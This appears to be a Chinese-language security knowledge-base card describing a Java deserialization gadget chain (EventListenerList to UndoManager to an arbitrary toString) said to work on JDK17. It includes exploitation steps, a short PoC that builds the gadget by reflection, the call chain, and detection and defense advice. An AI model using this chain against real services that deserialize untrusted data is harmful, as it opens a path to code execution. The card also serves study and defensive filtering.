---
id: web-java-deserialization-jdk-eventlistenerlist-tostring
title: EventListenerList 反序列化触发任意 toString（JDK17 可用）
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: eventlistenerlist-tostring-trigger
tags:
- java
- deserialization
- gadget
- tostring
- jdk
- eventlistenerlist
- undomanager
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:30:58+08:00'
  notes: 已对照原文核对：listenerList 成对 {Class, UndoManager}、readObject→add→UndoManager/CompoundEdit→Vector→String.valueOf→任意 toString 链一致，JDK15 后 BadAttributeValueExpException 失效的版本边界说明正确；未验证点：原文未附运行日志，add 的触发点是异常消息拼接 l.toString()，卡片表述较笼统但方向正确
url: /docs/web/java/deserialization/jdk/web-java-deserialization-jdk-eventlistenerlist-tostring/
draft: false
kb_aliases:
- EventListenerList toString
- UndoManager toString 链
- JDK17 toString gadget
- CompoundEdit Vector toString
- 高版本 toString 触发
---

## 一句话结论

构造 `EventListenerList` 使其 `listenerList` 中的 `UndoManager` 持有含恶意对象的 `Vector`，反序列化时 `EventListenerList.readObject → add → UndoManager.toString → Vector.toString → String.valueOf` 会调用恶意对象的 `toString`，在 JDK17 上仍可用。

## 原理

- `EventListenerList` 的 `listenerList` 字段是一个 `Object[]`，按 `{监听器类型 Class, 监听器实例, ...}` 成对存储。`readObject` 会遍历数组并调用 `add(Class, Object)`。
- `add` 内部会调用监听器/容器的 `toString` 相关方法；把 `UndoManager` 作为监听器放入后，链路进入 `UndoManager.toString()`。
- `UndoManager` 继承 `CompoundEdit`，`CompoundEdit.toString()` 会拼接其 `edits`（`Vector`）的字符串；`Vector.toString()` 走 `AbstractCollection.toString()` → `StringBuilder.append()` → `String.valueOf(obj)` → `obj.toString()`。
- 因此只要把目标 `toString` gadget 对象放进 `UndoManager.edits`，再包进 `EventListenerList.listenerList`，反序列化即可触发。
- 与 `BadAttributeValueExpException` 不同，该链不依赖 `val` 字段类型；JDK15 起 `BadAttributeValueExpException.val` 变为 `String`，原 toString 链失效，而 EventListenerList 链在 JDK17 仍成立。

## 触发条件

- 目标可反序列化攻击者可控的 Java 序列化流（原生反序列化入口）。
- classpath 存在 `javax.swing.event.EventListenerList`、`javax.swing.undo.UndoManager`（JDK 自带）。
- 存在可利用的 `toString` gadget（如 TemplatesImpl、EL 表达式包装类等），本链只负责触发。

## 利用步骤

1. 用反射创建 `EventListenerList` 与 `UndoManager`。
2. 取出 `UndoManager` 父类 `CompoundEdit` 的 `edits`（`Vector`），把恶意对象加入。
3. 把 `listenerList` 设为 `new Object[]{Class.class, undoManager}`（成对）。
4. 序列化 `EventListenerList`，通过目标反序列化入口发送。
5. 反序列化时触发恶意对象 `toString`，执行后续 gadget。

## PoC

```java
public static EventListenerList getEventListenerList(Object obj) throws Exception {
    EventListenerList list = new EventListenerList();
    UndoManager undoManager = new UndoManager();

    Vector vector = (Vector) Utils.getFieldValue(undoManager, "edits");
    vector.add(obj);

    Utils.setFieldValue(list, "listenerList", new Object[]{Class.class, undoManager});
    return list;
}
```

调用链：

```text
EventListenerList#readObject
  -> EventListenerList#add
    -> UndoManager#toString
      -> CompoundEdit#toString
        -> Vector#toString
          -> AbstractCollection#toString
            -> StringBuilder#append
              -> String#valueOf
                -> obj#toString()
```

## 变体与关联

- 变体：`listenerList` 中的类型 Class 可换其他事件类型；`UndoManager` 可替换为其他 `toString` 会遍历集合的类；若目标没有 `UndoManager`，可尝试 `CompoundEdit` 的其他子类。
- 关联：[[web-java-deserialization-jdk-xstring-equals-tostring]]（XString.equals 触发 toString）；[[web-java-deserialization-jdk-hashtable-textandmnemonic-tostring]]（Hashtable 触发 toString）；[[web-java-deserialization-comparator-rhino]]（另一类 toString 触发面）。
- 边界：本链只触发 `toString`，最终危害取决于选用的 toString gadget；JDK8 与 JDK17 行为基本一致。

## 检测与防御

- 检测：反序列化流中出现 `EventListenerList`、`UndoManager`、`CompoundEdit` 等异常组合；`toString` gadget 类出现在异常栈；反序列化入口接收外部数据。
- 防御：对反序列化入口使用 `ObjectInputFilter` 类白名单，禁止 `EventListenerList`/`UndoManager` 等非业务类；升级/限制 gadget 依赖；避免原生 Java 反序列化，改用 JSON 等数据格式。
